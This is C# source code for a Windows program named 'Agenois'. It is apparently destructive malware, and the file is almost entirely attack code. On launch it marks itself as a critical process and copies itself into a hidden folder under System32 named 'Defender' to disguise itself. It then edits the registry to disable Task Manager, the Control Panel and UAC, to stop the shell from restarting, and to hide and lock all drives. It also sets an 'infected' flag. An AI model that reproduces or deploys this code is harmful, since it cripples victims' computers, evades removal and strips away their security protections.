using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;
using System.Threading;
using System.Diagnostics;
using Agenois.Properties;
using Agenois.Payloads;
using Agenois.Utils;
using System.Media;

namespace Agenois
{
    public partial class MainThread : Form
    {
        public MainThread()
        {
            InitializeComponent();

            //Everything on startup.

            Destructive.EnableCriticalMode();

            RegistryKey editKey;

            if (Process.GetProcessesByName("Agenois").Count() > 1) { Environment.Exit(0); }

            string extractPath = @"C:\Windows\System32\Defender";

            if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Agenois", "AgenoisInfected", null) == null)
            {
                Directory.CreateDirectory(extractPath);
                //File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
                File.Copy(Application.ExecutablePath, extractPath + @"\Agenois.exe");

                DirectoryInfo ch = new DirectoryInfo(extractPath);
                ch.Attributes = FileAttributes.Hidden;

                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                editKey.SetValue("NoControlPanel", "1");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
                editKey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                editKey.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                editKey.SetValue("DisableTaskMgr", "1");
                editKey.Close();

                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                editKey.SetValue("NoViewOnDrive", 67108863, RegistryValueKind.DWord);
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                editKey.SetValue("NoDrives", 67108863, RegistryValueKind.DWord);
                editKey.Close();

            }
        }

        private void MainThread_Load(object sender, EventArgs e)
        {

        }
    }
}
